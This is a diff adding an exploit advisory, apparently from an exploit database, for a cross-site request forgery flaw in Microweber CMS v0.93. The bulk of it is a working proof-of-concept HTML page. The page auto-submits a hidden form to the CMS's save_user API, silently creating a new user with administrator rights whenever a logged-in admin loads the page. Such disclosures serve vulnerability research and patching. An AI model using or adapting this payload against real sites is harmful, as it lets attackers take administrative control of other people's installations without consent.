@@ -1,0 +1,36 @@
+###########################################################
+[~] Exploit Title: Microweber CMS v0.93 CSRF Vulnerability
+[~] Author: sajith
+[~] version: Microweber CMS v0.93
+[~]Vendor Homepage: http://microweber.com/
+[~] vulnerable app link:http://microweber.com/download
+###########################################################
+
+[*] Application is vulnerable to CSRF.below is the POC where attacker can
+use this vulnerability to create new user and assign Admin role to the user
+
+
+<head>
+<title>POC by sajith shetty</title>
+</head>
+<body>
+<form action="
+http://127.0.0.1/cms/microweber-0.9343/microweber-master/api/save_user"
+id="formid" method="post">
+<input type="hidden" name="id" value="0" />
+<input type="hidden" name="thumbnail" value="" />
+<input type="hidden" name="username" value="test1" />
+<input type="hidden" name="password" value="mypassword" />
+<input type="hidden" name="email" value="test@testing.com" />
+<input type="hidden" name="first_name" value="abc" />
+<input type="hidden" name="last_name" value="xyz" />
+<input type="hidden" name="is_active" value="y" />
+<input type="hidden" name="is_admin" value="y" />
+<input type="hidden" name="basic_mode" value="n" />
+<input type="hidden" name="api_key" value="1234" />
+</form>
+<script>
+document.getElementById('formid').submit();
+</script>
+</body>
+</html>
